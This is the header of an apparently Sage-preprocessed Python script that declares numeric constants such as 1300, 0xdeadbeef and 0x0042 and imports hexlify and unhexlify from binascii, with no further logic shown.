_sage_const_1300 = Integer(1300); _sage_const_0 = Integer(0); _sage_const_1 = Integer(1); _sage_const_32 = Integer(32); _sage_const_33 = Integer(33); _sage_const_34 = Integer(34); _sage_const_39 = Integer(39); _sage_const_64 = Integer(64); _sage_const_8 = Integer(8); _sage_const_16 = Integer(16); _sage_const_0xdeadbeef = Integer(0xdeadbeef); _sage_const_0x00000007 = Integer(0x00000007); _sage_const_0x0042 = Integer(0x0042); _sage_const_2 = Integer(2)
from binascii import hexlify, unhexlify
